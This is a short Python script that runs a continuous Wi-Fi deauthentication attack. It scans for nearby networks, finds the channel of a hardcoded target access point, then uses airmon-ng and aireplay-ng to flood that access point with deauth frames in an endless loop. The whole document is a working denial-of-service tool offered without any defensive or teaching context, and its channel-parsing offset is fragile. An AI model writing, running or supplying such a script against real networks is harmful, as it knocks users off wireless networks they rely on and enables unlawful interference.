from os import system
from time import sleep

target_1 = '2c:7f:11:kl:62:01'.upper() #FOR EXAMPLE

def NetworkCard():
    system('systemctl restart NetworkManager')
    sleep(2)
    system('iwlist wlp2s0 scan > /root/WifiScan.log')

def DosAttack():
    file = open('/root/WifiScan.log', 'r').read()
    FindTarget = file.find(target_1)

    FindChannel = FindTarget + 46
    DefineChannel = file[FindChannel:].split("\n")
	
    system('airmon-ng check kill')
    system('airmon-ng start wlp2s0')
    #sleep(1)
    system('iwconfig wlp2s0mon channel '+str(DefineChannel[0]))
    #sleep(1)
    system('aireplay-ng --deauth 70 -a '+target_1+' wlp2s0mon')
    system('airmon-ng stop wlp2s0mon')

while True:
    NetworkCard()
    DosAttack()
